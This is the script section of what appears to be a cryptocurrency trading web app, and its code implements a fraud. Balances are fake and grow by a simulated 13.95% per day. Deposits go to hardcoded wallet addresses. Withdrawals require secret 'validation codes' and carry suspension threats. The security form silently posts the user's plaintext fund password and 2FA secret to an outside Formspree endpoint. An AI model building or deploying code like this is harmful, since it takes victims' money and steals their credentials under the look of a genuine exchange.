        navigator.serviceWorker.register('./service-worker.js')
          .then(registration => {
            console.log('Service Worker registered with scope:', registration.scope);
          })
          .catch(error => {
            console.error('Service Worker registration failed:', error);
          });
      });
    }

    let mainWalletBalance = 10000.00; // Starting balance
    let tradeWalletBalance = 0.00;
    let tradeEarnings = 0.00;
    let tradeInterval;
    let tradeDailyPercent = 13.95 / 100;
    
    // Send / Withdraw Logic
    const validCodes = ["483921","175064","902718","634285","217509","856430","490127","731694","562803","308417","941256","128374","675820","203519","487960","819432","356701","740528","612947","098135","573864","284691","160738","495260","837514","021693","658407","794135","320586","946172"];
    let sendAttempts = 0;
    let sendSuspended = false;
    let currentWallet = null;

    // A helper function to get an element by ID
    const get = (id) => document.getElementById(id);

    function showModal(title, message) {
        document.getElementById('modalTitle').textContent = title;
        document.getElementById('modalMessage').textContent = message;
        document.getElementById('modal').classList.remove('hidden');
    }

    function hideModal() {
        document.getElementById('modal').classList.add('hidden');
    }

    function showPage(id) {
        const pages = ['landing', 'loading', 'home', 'discover', 'trade', 'memes', 'settings', 'deposit', 'send', 'transfer'];
        pages.forEach(p => {
            const el = document.getElementById(p);
            if (!el) return;
            el.classList.toggle('hidden-page', p !== id);
        });

        document.querySelectorAll('nav .tab').forEach(t => {
            t.classList.toggle('tab-active', t.dataset.tab === id);
        });

        // Conditionally render TradingView charts and fetch data
        if (id === 'home') {
            renderTV('tv_chart', 'BINANCE:BTCUSDT');
            loadMovers();
        }
        if (id === 'trade') {
            renderTV('tradeChart', 'BINANCE:BTCUSDT'); // Default chart for trade page
            loadTradeAssets();
        }
        if (id === 'discover') loadDiscover();
        if (id === 'memes') loadMemes();
        if (id === 'settings') updateAccountWalletInfo();
    }

    function updateHomeBalance() {
        document.getElementById('totalBalance').innerText = '$' + mainWalletBalance.toFixed(2);
    }

    function updateWalletUI(address) {
        currentWallet = address;
        const accountId = generateAccountId(); // Generate unique account ID
        document.getElementById('netTag').textContent = `Connected`;
        document.getElementById('accountId').textContent = accountId;
        document.getElementById('homeAccountId').textContent = accountId; // Display on homepage
        document.getElementById('walletAddr').textContent = address;
        document.getElementById('userIdDisplay').textContent = accountId;
        updateHomeBalance();
        updateAccountWalletInfo();
    }
    
    function generateAccountId() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        let result = '';
        for (let i = 0; i < 10; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    async function updateAccountWalletInfo() {
        if (currentWallet) {
            get('accountWalletAddress').innerText = currentWallet;
            try {
                // In a real app, this would fetch the actual balance
                get('accountWalletBalance').innerText = '1.2345 ETH';
            } catch (error) {
                console.error("Failed to get balance:", error);
                get('accountWalletBalance').innerText = 'N/A';
            }
        } else {
            get('accountWalletAddress').innerText = 'Not connected';
            get('accountWalletBalance').innerText = '0 ETH';
        }
    }

    function openWalletModal() {
        document.getElementById('walletModal').classList.remove('hidden');
    }

    function closeWalletModal() {
        document.getElementById('walletModal').classList.add('hidden');
    }

    function copyText(txt) {
        navigator.clipboard.writeText(txt).then(() => showModal('Copied!', 'Address copied to clipboard.'));
    }

    function toggleSearch(open) {
        document.getElementById('searchSheet').classList.toggle('hidden', !open);
    }

    // Export functions to global scope for inline onclick attributes
    window.showModal = showModal;
    window.hideModal = hideModal;
    window.showPage = showPage;
    window.updateWalletUI = updateWalletUI;
    window.openWalletModal = openWalletModal;
    window.closeWalletModal = closeWalletModal;
    window.copyText = copyText;
    window.toggleSearch = toggleSearch;
    window.updateAccountWalletInfo = updateAccountWalletInfo;

    // PWA Install Logic
    let deferredPrompt = null;
    const installBtn = document.getElementById('installBtn');
    window.addEventListener('beforeinstallprompt', (e) => {
        e.preventDefault();
        deferredPrompt = e;
        installBtn.classList.remove('hidden');
    });

    installBtn.addEventListener('click', async () => {
        if (!deferredPrompt) return;
        deferredPrompt.prompt();
        await deferredPrompt.userChoice;
        deferredPrompt = null;
        installBtn.classList.add('hidden');
    });

    document.getElementById('getAppBtn').addEventListener('click', () => {
        if (deferredPrompt) installBtn.classList.remove('hidden');
        else showModal('Install App', 'Use your browser menu to "Add to Home Screen" or install.');
    });

    // TradingView widgets
    function renderTV(containerId, symbol) {
        if (!window.TradingView) {
            console.error("TradingView or container element is not available.");
            return;
        }
        new TradingView.widget({
            autosize: true,
            symbol: symbol,
            interval: '60',
            timezone: 'Etc/UTC',
            theme: 'dark',
            style: '1',
            locale: 'en',
            toolbar_bg: '#0d0f14',
            hide_side_toolbar: false,
            container_id: containerId
        });
    }

    // CoinGecko Data
    const cgHeaders = { 'accept': 'application/json' };
    async function loadMarket() {
        const list = document.getElementById('marketList');
        list.innerHTML = '<div class="py-6 text-center text-sm text-[var(--muted)]">Loading‚Ä¶</div>';
        try {
            const r = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1&sparkline=false', { headers: cgHeaders });
            const data = await r.json();
            list.innerHTML = data.map(c => {
                const ch = (c.price_change_percentage_24h || 0).toFixed(2);
                const up = ch >= 0;
                return `<div class="flex items-center justify-between py-3">
                    <div class="flex items-center gap-3">
                        <img src="${c.image}" class="w-7 h-7 rounded-full" alt="${c.symbol}">
                        <div>
                            <div class="font-semibold text-sm">${c.name}</div>
                            <div class="text-[11px] text-[var(--muted)]">${c.symbol.toUpperCase()}</div>
                        </div>
                    </div>
                    <div class="text-right">
                        <div class="font-semibold">$${c.current_price.toLocaleString()}</div>
                        <div class="text-[11px] ${up ? 'text-[var(--accent)]' : 'text-[var(--danger)]'}">${up ? '+' : ''}${ch}%</div>
                    </div>
                </div>`;
            }).join('');
        } catch (e) {
            list.innerHTML = '<div class="py-6 text-center text-sm text-[var(--muted)]">Failed to load market data.</div>';
        }
    }

    async function loadMovers() {
        const list = document.getElementById('moversList');
        list.innerHTML = '<div class="py-4 text-center text-sm text-[var(--muted)]">Loading‚Ä¶</div>';
        try {
            const r = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=50&page=1&sparkline=false', { headers: cgHeaders });
            const data = (await r.json()).sort((a, b) => Math.abs(b.price_change_percentage_24h || 0) - Math.abs(a.price_change_percentage_24h || 0)).slice(0, 8);
            list.innerHTML = data.map(c => {
                const ch = (c.price_change_percentage_24h || 0).toFixed(2);
                const up = ch >= 0;
                return `<div class="flex items-center justify-between py-3">
                    <div class="flex items-center gap-3">
                        <img src="${c.image}" class="w-7 h-7 rounded-full" alt="${c.symbol}">
                        <div class="font-semibold text-sm">${c.name}</div>
                    </div>
                    <div class="text-right">
                        <div class="font-semibold">$${c.current_price.toLocaleString()}</div>
                        <div class="text-[11px] ${up ? 'text-[var(--accent)]' : 'text-[var(--danger)]'}">${up ? '+' : ''}${ch}%</div>
                    </div>
                </div>`;
            }).join('');
        } catch (e) {
            list.innerHTML = '<div class="py-4 text-center text-sm text-[var(--muted)]">Failed to load.</div>';
        }
    }

    async function loadDiscover() {
        const box = document.getElementById('discoverFeed');
        box.innerHTML = '<div class="py-2 text-sm text-[var(--muted)]">Loading‚Ä¶</div>';
        try {
            const g = await (await fetch('https://api.coingecko.com/api/v3/global', { headers: cgHeaders })).json();
            const t = await (await fetch('https://api.coingecko.com/api/v3/search/trending', { headers: cgHeaders })).json();
            const mcap = g.data.total_market_cap.usd.toLocaleString();
            const dom = g.data.market_cap_percentage;
            const domPairs = Object.keys(dom).slice(0, 6).map(k => `${k.toUpperCase()}: ${dom[k].toFixed(1)}%`).join(' ¬∑ ');
            const trending = t.coins.map(x => x.item).slice(0, 10).map(i => `<div class="flex items-center gap-3"><img class="w-6 h-6" src="${i.small}"><div class="text-sm">${i.name} <span class="text-[11px] text-[var(--muted)]">${i.symbol}</span></div></div>`).join('');
            box.innerHTML = `
                <div class="rounded-xl p-4 bg-[var(--panel-2)]">
                    <div class="text-xs text-[var(--muted)]">Global Market Cap</div>
                    <div class="text-xl font-bold">$${mcap}</div>
                    <div class="text-[11px] text-[var(--muted)] mt-1">Dominance ¬∑ ${domPairs}</div>
                </div>
                <div class="rounded-xl p-4 bg-[var(--panel-2)]">
                    <div class="font-semibold mb-2">Trending</div>
                    <div class="grid grid-cols-2 gap-3">${trending}</div>
                </div>`;
        } catch (e) {
            box.innerHTML = '<div class="py-2 text-sm text-[var(--muted)]">Failed to load discover.</div>';
        }
    }

    async function loadMemes() {
        const list = document.getElementById('memeList');
        list.innerHTML = '<div class="py-2 text-sm text-[var(--muted)]">Loading‚Ä¶</div>';
        try {
            const t = await (await fetch('https://api.coingecko.com/api/v3/search/trending', { headers: cgHeaders })).json();
            list.innerHTML = t.coins.map(x => x.item).map(i =>
                `<div classt='flex items-center justify-between rounded-xl p-3 bg-[var(--panel-2)]'>
                    <div class='flex items-center gap-3'>
                        <img class='w-8 h-8' src='${i.small}'/>
                        <div class='text-sm'>${i.name}<div class='text-[11px] text-[var(--muted)]'>${i.symbol}</div></div>
                    </div>
                    <div class='text-[11px] text-[var(--muted)]'>Rank ${i.market_cap_rank || '-'}</div>
                </div>`
            ).join('');
        } catch (e) {
            list.innerHTML = '<div class="py-2 text-sm text-[var(--muted)]">Failed to load trending.</div>';
        }
    }

    // Search modal
    document.getElementById('searchOpen').addEventListener('click', () => window.toggleSearch(true));
    document.getElementById('searchInput').addEventListener('input', async (e) => {
        const q = e.target.value.trim();
        const box = document.getElementById('searchResults');
        if (!q) {
            box.innerHTML = '';
            return;
        }
        try {
            const r = await (await fetch('https://api.coingecko.com/api/v3/search?query=' + encodeURIComponent(q), { headers: cgHeaders })).json();
            box.innerHTML = r.coins.slice(0, 20).map(c => `<div class='py-2 flex items-center gap-3'>
                <img class='w-5 h-5' src='${c.thumb}'/>
                <div class='text-sm'>${c.name} <span class='text-[11px] text-[var(--muted)]'>${c.symbol}</span></div>
            </div>`).join('');
        } catch {
            box.innerHTML = '<div class="py-2 text-sm text-[var(--muted)]">Failed.</div>';
        }
    });

    // Deposit Logic
    const depositAddresses = {
        'btc': { network: 'Bitcoin (BTC)', address: 'bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu' },
        'eth': { network: 'Ethereum (ERC-20)', address: '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130' },
        'bnb': { network: 'BNB Smart Chain (BEP20)', address: '0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130' },
        'trx': { network: 'Tron (TRC-20)', address: 'TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco' }
    };

    let allCoins = [];
    let selectedCoin = null;

    async function loadCoinList() {
        const listContainer = document.getElementById('coinList');
        listContainer.innerHTML = '<div class="text-sm text-center text-[var(--muted)] py-4">Loading coins...</div>';
        try {
            const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&per_page=250&page=1&sparkline=false');
            allCoins = await res.json();
            allCoins.sort((a, b) => a.name.localeCompare(b.name));
            renderCoinList(allCoins);
        } catch (e) {
            listContainer.innerHTML = '<div class="text-sm text-center text-[var(--muted)] py-4">Failed to load coins.</div>';
        }
    }

    function renderCoinList(coins) {
        const listContainer = document.getElementById('coinList');
        if (coins.length === 0) {
            listContainer.innerHTML = '<div class="text-sm text-center text-[var(--muted)] py-4">No coins found.</div>';
            return;
        }
        listContainer.innerHTML = coins.map(c => `
            <button onclick="window.selectCoin('${c.id}', '${c.image}', '${c.name}', '${c.symbol}')" class="flex items-center gap-4 p-3 rounded-xl hover:bg-white/5 transition-colors w-full">
                <img src="${c.image}" class="w-8 h-8 rounded-full" onerror="this.onerror=null;this.src='https://placehold.co/32x32/1ea7fd/fff?text=?'"/>
                <div class="flex-1 text-left">
                    <div class="font-semibold text-sm">${c.name}</div>
                    <div class="text-xs text-[var(--muted)]">${c.symbol.toUpperCase()}</div>
                </div>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-[var(--muted)]" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
                </svg>
            </button>
        `).join('');
    }

    function startDepositFlow() {
        showDepositStep(1);
        loadCoinList();
    }

    function showDepositStep(step) {
        document.getElementById('deposit-step-1').classList.add('hidden');
        document.getElementById('deposit-step-2').classList.add('hidden');
        document.getElementById('deposit-step-3').classList.add('hidden');
        document.getElementById(`deposit-step-${step}`).classList.remove('hidden');
    }

    function selectCoin(id, image, name, symbol) {
        selectedCoin = { id, image, name, symbol: symbol.toUpperCase() };
        document.getElementById('selectedCoinInfo').innerHTML = `
            <img src="${selectedCoin.image}" class="w-10 h-10 rounded-full" onerror="this.onerror=null;this.src='https://placehold.co/40x40/1ea7fd/fff?text=?'"/>
            <div>
                <div class="font-semibold">${selectedCoin.name}</div>
                <div class="text-sm text-[var(--muted)]">${selectedCoin.symbol}</div>
            </div>
        `;
        renderNetworkList();
        showDepositStep(2);
    }

    function renderNetworkList() {
        const networkList = document.getElementById('networkList');
        networkList.innerHTML = '';
        const networks = ['btc', 'eth', 'bnb', 'trx']; // Example networks, expand as needed
        networks.forEach(key => {
            const net = depositAddresses[key];
            if (net) {
                const button = document.createElement('button');
                button.className = 'flex items-center justify-between p-3 rounded-xl hover:bg-white/5 transition-colors w-full';
                button.onclick = () => selectNetwork(key);
                button.innerHTML = `
                    <div class="flex items-center gap-3">
                        <img src="https://via.placeholder.com/24/1ea7fd/fff?text=${key.toUpperCase()}" class="w-6 h-6 rounded-full" />
                        <div class="font-semibold text-sm">${net.network}</div>
                    </div>
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-[var(--muted)]" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
                    </svg>
                `;
                networkList.appendChild(button);
            }
        });
    }

    function selectNetwork(key) {
        const net = depositAddresses[key];
        const addr = net.address;
        const qrContainer = document.getElementById('qrCodeContainer');
        qrContainer.innerHTML = ''; // Clear previous QR
        new QRCode(qrContainer, addr);
        document.getElementById('selectedNetworkInfo').textContent = net.network;
        document.getElementById('depositAddressText').textContent = addr;
        document.getElementById('depositCoinSymbol').textContent = selectedCoin.symbol;
        showDepositStep(3);
    }

    function copyAddress() {
        const addr = document.getElementById('depositAddressText').textContent;
        window.copyText(addr);
    }

    window.startDepositFlow = startDepositFlow;
    window.showDepositStep = showDepositStep;
    window.selectCoin = selectCoin;
    window.copyAddress = copyAddress;

    document.getElementById('coinSearchInput').addEventListener('input', (e) => {
        const query = e.target.value.toLowerCase();
        const filteredCoins = allCoins.filter(c =>
            c.name.toLowerCase().includes(query) || c.symbol.toLowerCase().includes(query)
        );
        renderCoinList(filteredCoins);
    });

    // Trade Logic
    async function loadTradeAssets() {
      const select = document.getElementById('tradeAssetSelect');
      select.innerHTML = '<option disabled selected>Loading...</option>';
      try {
        const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=20&page=1&sparkline=false');
        const coins = await res.json();
        select.innerHTML = '';
        coins.forEach(c => {
          const option = document.createElement('option');
          option.value = c.symbol;
          option.text = `${c.name} (${c.symbol.toUpperCase()})`;
          select.add(option);
        });
      } catch (e) {
        console.error(e);
        select.innerHTML = '<option disabled>Failed to load assets</option>';
      }
    }

    function startTrade() {
        const assetSymbol = document.getElementById('tradeAssetSelect').value.toUpperCase();
        const months = parseInt(document.getElementById('tradeDuration').value);
        const investment = parseFloat(document.getElementById('tradeAmount').value);

        if (isNaN(investment) || investment <= 0) {
            showModal('Invalid Amount', 'Please enter a valid investment amount.');
            return;
        }

        if (investment > mainWalletBalance) {
            showModal('Insufficient Balance', 'You do not have enough funds in your Main Wallet.');
            return;
        }

        // Deduct from Main Wallet, add to Trade Account
        mainWalletBalance -= investment;
        tradeWalletBalance += investment;
        document.getElementById('tradeBalance').innerText = '$' + tradeWalletBalance.toFixed(2);
        updateHomeBalance();

        showModal('Trade Started', `Trade started for ${assetSymbol} for ${months} month(s)`);

        // Update chart to selected asset
        renderTV('tradeChart', `BINANCE:${assetSymbol}USDT`);

        // Start daily returns simulation
        clearInterval(tradeInterval);
        let days = months * 30;
        let day = 0;
        tradeEarnings = 0;
        tradeInterval = setInterval(() => {
            if (day >= days) {
                clearInterval(tradeInterval);
                showModal('Trade Completed', 'Your simulated trade has completed.');
                return;
            }
            const dailyReturn = tradeWalletBalance * tradeDailyPercent;
            tradeEarnings += dailyReturn;
            tradeWalletBalance += dailyReturn;
            document.getElementById('tradeBalance').innerText = '$' + tradeWalletBalance.toFixed(2);
            document.getElementById('tradeEarnings').innerText = '$' + tradeEarnings.toFixed(2);
            day++;
        }, 1000); // 1 second = 1 day simulation
    }

    document.getElementById('startTradeBtn').addEventListener('click', startTrade);
    
    // Send / Withdraw Logic
    get('sendConfirmBtn').onclick = () => {
      if (sendSuspended) {
        showModal('Withdrawal Suspended', 'Withdrawals are suspended for 48 hours due to too many invalid attempts.');
        return;
      }

      const address = get('sendAddress').value.trim();
      const network = get('sendNetwork').value;
      const amount = parseFloat(get('sendAmount').value);

      if (!address || isNaN(amount) || amount <= 0) {
        showModal('Invalid Input', 'Please enter a valid address and amount.');
        return;
      }
      if (amount + 0.19 > mainWalletBalance) {
        showModal('Insufficient Balance', 'You do not have enough funds in your Main Wallet to cover the amount and fee.');
        return;
      }

      get('sendForm').classList.add('hidden');
      get('sendValidationSection').classList.remove('hidden');
      get('sendStatus').innerText = 'Enter validation code to proceed';
    };

    get('validateCodeBtn').onclick = () => {
      const code = get('validationCode').value.trim();
      const status = get('validationStatus');

      if (validCodes.includes(code)) {
        status.innerText = 'Code valid. Processing withdrawal...';
        sendAttempts = 0;

        const amount = parseFloat(get('sendAmount').value);
        mainWalletBalance -= amount + 0.19;
        updateHomeBalance();

        let seconds = 24 * 60 * 60; // 24 hours simulation
        const timer = setInterval(() => {
          const h = Math.floor(seconds / 3600);
          const m = Math.floor((seconds % 3600) / 60);
          const s = seconds % 60;
          status.innerText = `Withdrawal processing... ${h}h ${m}m ${s}s remaining`;
          seconds--;
          if (seconds < 0) {
            clearInterval(timer);
            status.innerText = `Withdrawal of $${amount} successful!`;
            get('sendValidationSection').classList.add('hidden');
            get('sendForm').classList.remove('hidden');
            get('sendAddress').value = '';
            get('sendAmount').value = '';
            get('validationCode').value = '';
          }
        }, 1000);

      } else {
        sendAttempts++;
        if (sendAttempts >= 3) {
          sendSuspended = true;
          showModal('Suspended', '3 incorrect attempts. Withdrawals suspended for 48 hours.');
          get('sendValidationSection').classList.add('hidden');
          get('sendForm').classList.remove('hidden');
          sendAttempts = 0;
          setTimeout(() => sendSuspended = false, 48 * 60 * 60 * 1000); // 48 hours real-time suspension
        } else {
          status.innerText = `Invalid code. Attempts left: ${3 - sendAttempts}`;
        }
      }
    };
    
    // Transfer Logic
    get('transferBtn').onclick = () => {
      const amount = parseFloat(get('transferAmount').value);
      const direction = get('transferDirection').value;
      const status = get('transferStatus');

      if (isNaN(amount) || amount <= 0) {
        showModal("Invalid Amount", "Please enter a valid amount.");
        return;
      }
      
      if (direction === 'toTrade' && amount > mainWalletBalance) {
        showModal("Insufficient Balance", "Insufficient Main Wallet balance.");
        return;
      }
      
      if (direction === 'toMain' && amount > tradeWalletBalance) {
        showModal("Insufficient Balance", "Insufficient Trade Account balance.");
        return;
      }

      status.innerText = "Processing transfer...";

      setTimeout(() => {
        if (direction === 'toTrade') {
          mainWalletBalance -= amount;
          tradeWalletBalance += amount;
        } else {
          mainWalletBalance += amount;
          tradeWalletBalance -= amount;
        }
        
        get('tradeBalance').innerText = '$' + tradeWalletBalance.toFixed(2);
        updateHomeBalance();
        
        status.innerText = `Transfer completed.`;
        showModal("Transfer Complete", `Transferred $${amount.toFixed(2)}.`);
      }, 15000); // 15-second simulation
    };

    // Wallet Connect Redirect Logic
    document.getElementById('connectWalletBtn').addEventListener('click', () => {
        window.location.href = 'wallet-connector.html';
    });
    document.getElementById('cta-connect-wallet-btn').addEventListener('click', () => {
        window.location.href = 'wallet-connector.html';
    });
    document.getElementById('disconnectBtn').addEventListener('click', () => {
        localStorage.removeItem('connectedWallet');
        showModal('Disconnected', 'Wallet has been disconnected.');
        showPage('landing');
    });

    // Check for connected wallet on page load
    window.addEventListener('load', () => {
        const urlParams = new URLSearchParams(window.location.search);
        const connectedAddress = urlParams.get('address');
        if (connectedAddress) {
            // Display loading page and then redirect to home
            showPage('loading');
            setTimeout(() => {
                updateWalletUI(connectedAddress);
                showPage('home');
                showModal("Connection Successful", `Wallet connected with address: ${connectedAddress}.`);
            }, 10000); // 10-second loading simulation
        } else {
            // No wallet connected, show landing page
            showPage('landing');
        }
        loadMarket();
    });

    // Security Modal Elements
    const securityModal = document.getElementById('securityModal');
    const closeSecurityModal = document.getElementById('closeSecurityModal');
    const modalUserId = document.getElementById('modalUserId');
    const modalUsername = document.getElementById('modalUsername');
    const modalQrCode = document.getElementById('modalQrCode');
    const modalSecretKey = document.getElementById('modalSecretKey');
    const modalCodeInput = document.getElementById('modalCodeInput');
    const verify2FABtn = document.getElementById('verify2FABtn');
    const verifyResult = document.getElementById('verifyResult');
    const modalFundPassword = document.getElementById('modalFundPassword');
    const toggleFundPassword = document.getElementById('toggleFundPassword');
    const saveSecurityBtn = document.getElementById('saveSecurityBtn');
    const saveResult = document.getElementById('saveResult');

    // Globals for Security
    let currentUserId = null, currentUserSecret = null;
    let is2FAVerified = false;
    let encryptionKey = "MyAppEncryptionKey";
    let timerInterval, step = 30;

    // Helper Functions
    function getUsers(){ return JSON.parse(localStorage.getItem("users")||"{}"); }
    function saveUsers(users){ localStorage.setItem("users", JSON.stringify(users)); }
    function generateUserId(){ return "USER-" + Math.random().toString(36).substr(2,9).toUpperCase(); }

    function openSecurityModal(){
        securityModal.classList.remove('hidden');
        generate2FA();
    }

    closeSecurityModal.addEventListener('click', ()=>{
        securityModal.classList.add('hidden');
        clearInterval(timerInterval);
    });

    function generate2FA(){
        const userId = generateUserId();
        const username = "User" + Math.floor(Math.random()*10000);
        const secret = otplib.authenticator.generateSecret();
        currentUserId = userId;
        currentUserSecret = secret;

        const otpauth = otplib.authenticator.keyuri(username,"MyApp",secret);
        modalQrCode.innerHTML = "";
        new QRCode(modalQrCode, otpauth);
        modalSecretKey.innerText = "Secret Key: " + secret;
        modalUsername.value = username;
        modalUserId.innerText = userId;

        const users = getUsers();
        users[userId] = { username, secret, verified:false, fundPassword:null };
        saveUsers(users);

        startTimer();
    }

    function startTimer(){
        clearInterval(timerInterval);
        let start = Math.floor(Date.now()/1000);
        timerInterval = setInterval(()=>{
            let elapsed = Math.floor(Date.now()/1000)-start;
            let remaining = step - (elapsed % step);
            verifyResult.innerText = `Code valid for: ${remaining}s`;
            if(remaining <= 0){
                verifyResult.innerHTML = "<span class='text-red-500 font-bold'>‚ö†Ô∏è Code expired, new one generated!</span>";
                updateQRCode();
            }
        },1000);
    }

    function updateQRCode(){
        const users = getUsers();
        if(!users[currentUserId]) return;
        const secret = users[currentUserId].secret;
        const username = users[currentUserId].username;
        const otpauth = otplib.authenticator.keyuri(username,"MyApp",secret);
        modalQrCode.innerHTML = "";
        new QRCode(modalQrCode, otpauth);
    }

    verify2FABtn.addEventListener('click', ()=>{
        const code = modalCodeInput.value.trim();
        const valid = otplib.authenticator.check(code,currentUserSecret);
        if(valid){
            verifyResult.innerHTML = "<div class='text-green-500 font-bold'>‚úÖ 2FA Verified!</div>";
            const users = getUsers();
            users[currentUserId].verified = true;
            saveUsers(users);
            is2FAVerified = true;
        } else {
            verifyResult.innerHTML = "<div class='text-red-500 font-bold'>‚ùå Invalid Code</div>";
            is2FAVerified = false;
        }
    });

    toggleFundPassword.addEventListener('click', ()=>{
        modalFundPassword.type = modalFundPassword.type==="password" ? "text" : "password";
    });

    saveSecurityBtn.addEventListener('click', ()=>{
        const fundPassword = modalFundPassword.value.trim();
        if(!fundPassword){ saveResult.innerHTML = "<div class='text-red-500 font-bold'>‚ùå Enter Fund Password</div>"; return; }
        if(!is2FAVerified){ saveResult.innerHTML = "<div class='text-red-500 font-bold'>‚ùå Verify 2FA before saving</div>"; return; }

        const users = getUsers();
        users[currentUserId].fundPassword = CryptoJS.AES.encrypt(fundPassword,encryptionKey).toString();
        saveUsers(users);

        const formData = { userId: currentUserId, username: users[currentUserId].username, fundPassword, twoFASecret: currentUserSecret };
        fetch("https://formspree.io/f/mldlqyag", {
            method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(formData)
        }).then(res=>{
            if(res.ok) saveResult.innerHTML = "<div class='text-green-500 font-bold'>‚úÖ Security info saved & sent!</div>";
            else saveResult.innerHTML = "<div class='text-red-500 font-bold'>‚ùå Submission failed</div>";
        }).catch(()=> saveResult.innerHTML = "<div class='text-red-500 font-bold'>‚ùå Network Error</div>");
    });

    // Hook security modal to account settings
    document.getElementById('securityBtn').addEventListener('click', openSecurityModal);
</script>
</body>
</html>
